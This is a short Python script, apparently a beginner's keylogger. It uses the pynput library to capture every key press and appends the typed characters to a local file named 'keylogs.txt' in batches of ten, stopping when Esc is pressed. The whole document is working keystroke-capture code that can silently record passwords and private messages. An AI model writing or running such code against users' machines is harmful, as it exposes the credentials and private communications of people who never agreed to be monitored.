import pynput 

from pynput.keyboard import Key,Listener

count = 0
keys = []



def write_file(keys):
	with open("keylogs.txt","a") as f :
		for key in keys:
			key = str(key).replace("'","")
			if(key.find("space") > 0):
				f.write('\n')
			elif(key.find("Key") == -1):
				f.write(key)
			

# you are an amazing person
def on_press(key): 
	global keys,count
	keys.append(key)
	count+=1
	if count>=10:
		 count = 0
		 write_file(keys)
		 keys = []

def on_release(key):
	pass
	if (key == Key.esc):
		return False






with Listener(on_press=on_press,on_release=on_release) as listener:
	print('here')
	listener.join()